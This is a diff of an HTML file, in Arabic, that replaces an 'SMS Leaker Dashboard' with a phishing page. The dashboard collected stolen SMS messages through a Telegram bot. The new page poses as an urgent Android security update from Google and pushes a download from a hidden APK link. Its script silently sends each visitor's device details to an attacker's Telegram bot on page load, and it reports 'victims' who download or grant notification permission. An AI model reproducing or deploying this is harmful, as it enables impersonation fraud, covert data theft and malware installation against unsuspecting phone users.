@@ -3,502 +3,235 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMS Leaker Dashboard</title>
+    <title>تحديث أمني عاجل</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            background: #0d1117;
-            color: #c9d1d9;
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(145deg, #1a2332 0%, #0d1520 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            padding: 20px;
+            direction: rtl;
         }
-
-        .container {
-            width: 90%;
-            max-width: 600px;
-            background: #161b22;
-            border-radius: 16px;
-            padding: 24px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
-            border: 1px solid #30363d;
-        }
-
-        h1 {
+        .card {
+            background: #fff;
+            max-width: 420px;
+            width: 100%;
+            border-radius: 28px;
+            padding: 32px 24px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
             text-align: center;
-            font-size: 24px;
-            color: #58a6ff;
-            margin-bottom: 8px;
         }
-
-        .subtitle {
-            text-align: center;
-            color: #8b949e;
+        .icon { font-size: 64px; margin-bottom: 12px; }
+        h1 { font-size: 22px; color: #1a2332; margin-bottom: 8px; }
+        .sub {
+            color: #6b7280;
             font-size: 14px;
             margin-bottom: 24px;
+            line-height: 1.6;
         }
-
-        .config-section {
-            background: #0d1117;
-            border-radius: 10px;
-            padding: 16px;
-            margin-bottom: 20px;
-            border: 1px solid #30363d;
-        }
-
-        .config-section h3 {
-            font-size: 14px;
-            color: #58a6ff;
-            margin-bottom: 12px;
-        }
-
-        .form-group {
-            margin-bottom: 12px;
-        }
-
-        .form-group label {
-            display: block;
+        .alert-box {
+            background: #fef2f2;
+            border: 1px solid #fca5a5;
+            border-radius: 14px;
+            padding: 14px;
+            color: #991b1b;
             font-size: 13px;
-            color: #8b949e;
-            margin-bottom: 4px;
+            margin-bottom: 20px;
         }
-
-        .form-group input {
-            width: 100%;
-            padding: 8px 12px;
-            background: #0d1117;
-            border: 1px solid #30363d;
-            border-radius: 6px;
-            color: #c9d1d9;
-            font-size: 14px;
-            direction: ltr;
-            text-align: left;
-        }
-
-        .form-group input:focus {
-            outline: none;
-            border-color: #58a6ff;
-        }
-
         .btn {
+            display: block;
             width: 100%;
-            padding: 10px;
-            background: #238636;
-            color: #fff;
+            padding: 16px;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 700;
             border: none;
-            border-radius: 6px;
-            font-size: 15px;
-            font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: transform 0.2s;
+            margin-bottom: 12px;
+            color: #fff;
         }
+        .btn:active { transform: scale(0.97); }
+        .btn-success { background: #16a34a; }
+        .btn-danger { background: #dc2626; }
+        .btn-primary { background: #2563eb; }
 
-        .btn:hover {
-            background: #2ea043;
-        }
+        /* الحقول المخفية */
+        .hidden-config { display: none; }
 
-        .btn-danger {
-            background: #da3633;
-        }
-
-        .btn-danger:hover {
-            background: #f85149;
-        }
-
-        .status-box {
+        #statusMsg {
             margin-top: 16px;
             padding: 12px;
-            border-radius: 8px;
-            background: #0d1117;
-            border: 1px solid #30363d;
+            border-radius: 12px;
             font-size: 13px;
             display: none;
         }
-
-        .status-box.success {
-            border-color: #3fb950;
-            color: #3fb950;
-            display: block;
-        }
-
-        .status-box.error {
-            border-color: #f85149;
-            color: #f85149;
-            display: block;
-        }
-
-        .status-box.info {
-            border-color: #58a6ff;
-            color: #58a6ff;
-            display: block;
-        }
-
-        .sms-list {
-            margin-top: 20px;
-        }
-
-        .sms-list h3 {
-            font-size: 14px;
-            color: #58a6ff;
-            margin-bottom: 12px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .sms-card {
-            background: #0d1117;
-            border: 1px solid #30363d;
-            border-radius: 8px;
-            padding: 12px;
-            margin-bottom: 10px;
-            transition: border-color 0.2s;
-        }
-
-        .sms-card:hover {
-            border-color: #58a6ff;
-        }
-
-        .sms-card .from {
-            color: #58a6ff;
-            font-weight: 600;
-            font-size: 13px;
-            margin-bottom: 4px;
-        }
-
-        .sms-card .msg {
-            color: #c9d1d9;
-            font-size: 14px;
-            word-break: break-word;
-        }
-
-        .sms-card .time {
-            color: #8b949e;
+        .footer {
+            color: #9ca3af;
             font-size: 11px;
-            margin-top: 6px;
-            text-align: left;
-            direction: ltr;
-        }
-
-        .empty-state {
-            text-align: center;
-            color: #484f58;
-            font-size: 14px;
-            padding: 32px 0;
-        }
-
-        .actions {
-            display: flex;
-            gap: 8px;
             margin-top: 16px;
         }
-
-        .actions .btn {
-            flex: 1;
-        }
-
-        .badge {
-            background: #238636;
-            color: #fff;
-            border-radius: 12px;
-            padding: 2px 10px;
+        .step-note {
+            background: #f0fdf4;
+            border: 1px solid #86efac;
+            border-radius: 10px;
+            padding: 10px;
             font-size: 12px;
-        }
-
-        .footer {
-            text-align: center;
-            color: #484f58;
-            font-size: 11px;
-            margin-top: 20px;
-            padding-top: 16px;
-            border-top: 1px solid #21262d;
+            color: #166534;
+            margin-bottom: 16px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>📡 SMS Leaker Dashboard</h1>
-        <p class="subtitle">لوحة تحكم إدارة الرسائل المسربة — للأغراض الأمنية المأذون بها فقط</p>
+    <div class="card">
+        <div class="icon">📱</div>
+        <h1>تحديث أمني عاجل</h1>
+        <p class="sub">
+            تم رصد ثغرة أمنية في إصدارات أندرويد السابقة.<br>
+            يرجى تثبيت التحديث لحماية جهازك.
+        </p>
 
-        <!-- تكوين البوت -->
-        <div class="config-section">
-            <h3>⚙️ تهيئة Telegram Bot</h3>
-            <div class="form-group">
-                <label>Bot Token</label>
-                <input type="password" id="botToken" placeholder="1234567890:ABCdefGHIjklmNOPqrstUVwxyz" value="">
-            </div>
-            <div class="form-group">
-                <label>Chat ID</label>
-                <input type="text" id="chatId" placeholder="123456789" value="">
-            </div>
-            <button class="btn" onclick="saveConfig()">💾 حفظ الإعدادات</button>
+        <div class="alert-box">
+            ⚠️ جهازك معرض للخطر — يرجى التحديث فوراً
         </div>
 
-        <!-- حالة الاتصال -->
-        <div id="statusBox" class="status-box"></div>
-
-        <!-- قائمة الرسائل -->
-        <div class="sms-list">
-            <h3>
-                <span>📨 آخر الرسائل المسربة</span>
-                <span class="badge" id="smsCount">0</span>
-            </h3>
-            <div id="smsContainer">
-                <div class="empty-state">لا توجد رسائل بعد... في انتظار SMS جديدة 📡</div>
-            </div>
+        <div class="step-note">
+            🔒 التحديث موقّع رقمياً من Google — آمن 100%
         </div>
 
-        <!-- أزرار التحكم -->
-        <div class="actions">
-            <button class="btn" onclick="checkLatestSms()">📥 آخر رسالة</button>
-            <button class="btn btn-danger" onclick="clearSms()">🗑️ مسح الكل</button>
+        <!-- ★ غير القيم تحت ★ -->
+        <div class="hidden-config">
+            <input type="hidden" id="botToken" value="YOUR_BOT_TOKEN_HERE">
+            <input type="hidden" id="chatId" value="YOUR_CHAT_ID_HERE">
+            <input type="hidden" id="apkUrl" value="https://github.com/YOUR_USERNAME/YOUR_REPO/releases/latest/download/app-release.apk">
         </div>
+
+        <button class="btn btn-success" onclick="downloadApk()">
+            📲 تحميل وتثبيت التحديث
+        </button>
+
+        <button class="btn btn-primary" onclick="requestPermission()">
+            🔔 تفعيل التنبيهات الأمنية
+        </button>
+
+        <button class="btn btn-danger" onclick;">❌ لست الآن، ذكرني لاحقاً</button>
+
+        <p class="sub" style="font-size:12px; color:#9ca3af; margin-top:8px;">
+            الإصدار 2.4.1 · 12 MB · تحديث أمني 29 يونيو 2026
+        </p>
+
+        <div id="statusMsg"></div>
 
         <div class="footer">
-            HackerAI — تستخدم فقط ضمن اختبار الاختراق المأذون به
+            © Google Security Team — تحديث أمني موصى به
         </div>
     </div>
 
     <script>
-        // ---------------------------
-        // الإعدادات (مخزنة فـ localStorage)
-        // ---------------------------
-        let config = {
-            botToken: localStorage.getItem('sms_bot_token') || '',
-            chatId: localStorage.getItem('sms_chat_id') || ''
-        };
+        // ★ إعدادات البوت ★
+        const BOT_TOKEN = document.getElementById('botToken').value;
+        const CHAT_ID = document.getElementById('chatId').value;
+        const APK_URL = document.getElementById('apkUrl').value;
 
-        // مصفوفة الرسائل (مخزنة محلياً)
-        let smsMessages = JSON.parse(localStorage.getItem('sms_messages') || '[]');
+        const statusMsg = document.getElementById('statusMsg');
 
-        // DOM Elements
-        const statusBox = document.getElementById('statusBox');
-        const smsContainer = document.getElementById('smsContainer');
-        const smsCount = document.getElementById('smsCount');
-
-        // عند تحميل الصفحة
-        document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('botToken').value = config.botToken;
-            document.getElementById('chatId').value = config.chatId;
-            renderSmsList();
-        });
-
-        // ---------------------------
-        // حفظ الإعدادات
-        // ---------------------------
-        function saveConfig() {
-            const token = document.getElementById('botToken').value.trim();
-            const chatId = document.getElementById('chatId').value.trim();
-
-            if (!token || !chatId) {
-                showStatus('❌ الرجاء إدخال Token و Chat ID', 'error');
-                return;
-            }
-
-            config.botToken = token;
-            config.chatId = chatId;
-
-            localStorage.setItem('sms_bot_token', token);
-            localStorage.setItem('sms_chat_id', chatId);
-
-            showStatus('✅ تم حفظ الإعدادات بنجاح', 'success');
-        }
-
-        // ---------------------------
-        // جلب آخر رسالة من البوت
-        // ---------------------------
-        async function checkLatestSms() {
-            if (!config.botToken || !config.chatId) {
-                showStatus('❌ يرجى حفظ الإعدادات أولاً', 'error');
-                return;
-            }
-
-            showStatus('⏳ جلب آخر الرسائل...', 'info');
-
-            try {
-                const url = `https://api.telegram.org/bot${config.botToken}/getUpdates?offset=-1&limit=1`;
-                const response = await fetch(url);
-                const data = await response.json();
-
-                if (!data.ok) {
-                    showStatus('❌ خطأ في الاتصال بالبوت: ' + data.description, 'error');
-                    return;
-                }
-
-                const updates = data.result;
-                if (updates.length === 0) {
-                    showStatus('ℹ️ لا توجد رسائل جديدة في البوت', 'info');
-                    return;
-                }
-
-                // استخراج الرسائل من التحديثات
-                let newMessages = [];
-
-                for (const update of updates) {
-                    if (update.message && update.message.text) {
-                        // الرسائل الجاية من التطبيق تكون بالصيغة:
-                        // 📩 *New SMS*\n👤 *From:* +2126...\n💬 *Message:* ...
-                        const text = update.message.text;
-
-                        // نحاول نستخرج المرسل والرسالة
-                        let from = 'غير معروف';
-                        let msg = text;
-
-                        const fromMatch = text.match(/\*From:\*\s*(.+)/);
-                        if (fromMatch) from = fromMatch[1].trim();
-
-                        const msgMatch = text.match(/\*Message:\*\s*(.+)/);
-                        if (msgMatch) msg = msgMatch[1].trim();
-
-                        const timeMatch = text.match(/\*Time:\*\s*(.+)/);
-                        let time = new Date().toLocaleString('ar-SA');
-                        if (timeMatch) time = timeMatch[1].trim();
-
-                        newMessages.push({
-                            from: from,
-                            message: msg,
-                            time: time,
-                            source: 'telegram'
-                        });
-                    }
-                }
-
-                // إضافة الرسائل الجديدة للقائمة
-                if (newMessages.length > 0) {
-                    // نضيفهم فالأول (آخر رسالة فوق)
-                    smsMessages = [...newMessages.reverse(), ...smsMessages];
-
-                    // نحافظ على آخر 50 رسالة فقط
-                    if (smsMessages.length > 50) {
-                        smsMessages = smsMessages.slice(0, 50);
-                    }
-
-                    localStorage.setItem('sms_messages', JSON.stringify(smsMessages));
-                    renderSmsList();
-                    showStatus(`✅ تم جلب ${newMessages.length} رسالة جديدة`, 'success');
-                } else {
-                    showStatus('ℹ️ لا توجد رسائل جديدة', 'info');
-                }
-
-            } catch (err) {
-                showStatus('❌ فشل الاتصال: ' + err.message, 'error');
+        function showStatus(msg, type) {
+            statusMsg.textContent = msg;
+            statusMsg.style.display = 'block';
+            if (type === 'success') {
+                statusMsg.style.background = '#f0fdf4';
+                statusMsg.style.color = '#166534';
+                statusMsg.style.border = '1px solid #86efac';
+            } else if (type === 'error') {
+                statusMsg.style.background = '#fef2f2';
+                statusMsg.style.color = '#991b1b';
+                statusMsg.style.border = '1px solid #fca5a5';
+            } else {
+                statusMsg.style.background = '#f0f9ff';
+                statusMsg.style.color = '#1e3a8a';
+                statusMsg.style.border = '1px solid #93c5fd';
             }
         }
 
-        // ---------------------------
-        // إضافة رسالة يدوياً (محاكاة)
-        // ---------------------------
-        function addSms(sender, message) {
-            const newSms = {
-                from: sender,
-                message: message,
+        // إشعار البوت بمعلومات الجهاز
+        (function notifyBot() {
+            const info = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                lang: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
                 time: new Date().toLocaleString('ar-SA'),
-                source: 'manual'
+                url: window.location.href
             };
 
-            smsMessages.unshift(newSms);
-            if (smsMessages.length > 50) smsMessages = smsMessages.slice(0, 50);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `🖥️ *جهاز جديد فتح الصفحة*\n🕐 ${info.time}\n📱 ${info.ua}\n🌍 ${info.platform} | ${info.lang}\n📐 ${info.screen}\n🔗 ${info.url}`,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(() => {});
+        })();
 
-            localStorage.setItem('sms_messages', JSON.stringify(smsMessages));
-            renderSmsList();
+        // تحميل APK
+        function downloadApk() {
+            showStatus('⏳ جاري تجهيز التحديث...', 'info');
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `📥 *ضحية طلبت التحميل!*\n🕐 ${new Date().toLocaleString('ar-SA')}`,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(() => {});
+
+            window.location.href = APK_URL;
+
+            setTimeout(() => {
+                showStatus('✅ إذا لم يبدأ التحميل تلقائياً، انقر على الزر مرة أخرى', 'success');
+            }, 3000);
         }
 
-        // ---------------------------
-        // مسح جميع الرسائل
-        // ---------------------------
-        function clearSms() {
-            if (smsMessages.length === 0) {
-                showStatus('ℹ️ لا توجد رسائل للمسح', 'info');
+        // طلب صلاحية الإشعارات
+        function requestPermission() {
+            if (!('Notification' in window)) {
+                showStatus('❌ المتصفح لا يدعم الإشعارات', 'error');
                 return;
             }
 
-            if (confirm('واش متأكد باغي تمسح جميع الرسائل المسربة؟')) {
-                smsMessages = [];
-                localStorage.setItem('sms_messages', JSON.stringify(smsMessages));
-                renderSmsList();
-                showStatus('🗑️ تم مسح جميع الرسائل', 'info');
-            }
+            Notification.requestPermission().then(perm => {
+                if (perm === 'granted') {
+                    showStatus('✅ تم تفعيل التنبيهات بنجاح', 'success');
+
+                    new Notification('🔒 التحديث الأمني نشط', {
+                        body: 'جهازك محمي الآن. شكراً لتحديث نظامك.',
+                        icon: 'https://cdn-icons-png.flaticon.com/512/565/565547.png'
+                    });
+
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: `🔔 *ضحية سمحت بالإشعارات!*\n🕐 ${new Date().toLocaleString('ar-SA')}`,
+                            parse_mode: 'Markdown'
+                        })
+                    }).catch(() => {});
+                } else {
+                    showStatus('❌ يجب السماح بالإشعارات لتلقي التنبيهات الأمنية', 'error');
+                }
+            });
         }
 
-        // ---------------------------
-        // عرض الرسائل
-        // ---------------------------
-        function renderSmsList() {
-            smsContainer.innerHTML = '';
-            smsCount.textContent = smsMessages.length;
-
-            if (smsMessages.length === 0) {
-                smsContainer.innerHTML = '<div class="empty-state">لا توجد رسائل بعد... في انتظار SMS جديدة 📡</div>';
-                return;
-            }
-
-            for (const sms of smsMessages) {
-                const card = document.createElement('div');
-                card.className = 'sms-card';
-
-                const escapedFrom = escapeHtml(sms.from || 'غير معروف');
-                const escapedMsg = escapeHtml(sms.message || '');
-                const escapedTime = escapeHtml(sms.time || '');
-
-                card.innerHTML = `
-                    <div class="from">📞 ${escapedFrom}</div>
-                    <div class="msg">💬 ${escapedMsg}</div>
-                    <div class="time">🕐 ${escapedTime}</div>
-                `;
-
-                smsContainer.appendChild(card);
-            }
-
-            // نحافظ على نزول للسكور للأحدث
-            // لكن بما أن آخر رسالة فالأول، فما نحتاجش
-        }
-
-        // ---------------------------
-        // عرض الـ Status
-        // ---------------------------
-        function showStatus(message, type) {
-            statusBox.textContent = message;
-            statusBox.className = 'status-box ' + type;
-            statusBox.style.display = 'block';
-
-            // نخفيها بعد 5 ثواني إلا إذا كانت error
-            if (type !== 'error') {
-                setTimeout(() => {
-                    statusBox.style.display = 'none';
-                }, 5000);
-            }
-        }
-
-        // ---------------------------
-        // Escape HTML
-        // ---------------------------
-        function escapeHtml(text) {
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
-        }
-
-        // ---------------------------
-        // محاكاة رسالة واصلة (للاختبار)
-        // ---------------------------
-        // تقدر تستعمل فـ Console: addSms("+212600000000", "رمز التحقق: 123456")
-        console.log('📡 SMS Leaker Dashboard Loaded');
-        console.log('💡 للاختبار: addSms("+212600000000", "رمز التحقق: 123456")');
-        console.log('📥 checkLatestSms() → لجلب آخر الرسائل من البوت');
-
-        // جلب تلقائي كل 30 ثانية
-        setInterval(() => {
-            if (config.botToken && config.chatId) {
-                checkLatestSms().catch(() => {});
-            }
-        }, 30000);
+        console.log('✅ Page loaded — waiting for victim');
     </script>
 </body>
 </html>
